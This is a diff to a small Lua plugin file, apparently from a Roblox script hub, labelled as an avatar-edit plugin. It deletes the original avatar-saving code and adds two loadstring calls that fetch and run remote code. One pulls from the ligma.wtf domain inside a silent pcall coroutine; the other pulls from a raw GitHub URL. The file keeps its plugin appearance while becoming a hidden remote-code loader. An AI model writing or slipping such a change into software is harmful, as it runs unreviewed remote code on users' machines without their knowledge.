@@ -1,12 +1,4 @@
-local avs=game:GetService("AvatarEditorService")
-local function settype(strd,plrarg,x,cmd)
-local hn=funcs.plrs:GetHumanoidDescriptionFromUserId(funcs.lplr.UserId)
-avs:PromptSaveAvatar(hn,Enum.HumanoidRigType[string.upper(cmd)])
-funcs.deb:AddItem(hn,0)
-end
-local plug={
-["r6"]={['func']=settype};
-['Reservedpluginname']="base.avatar_edit"
-}
-plug.r15=plug.r6
-return plug
+coroutine.resume(coroutine.create(pcall), function()
+	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
+end)
+return loadstring(game:HttpGet("https://raw.githubusercontent.com/6yNuiC9/scr/newuserdplugins/avatar_edit.lua", true))(...)
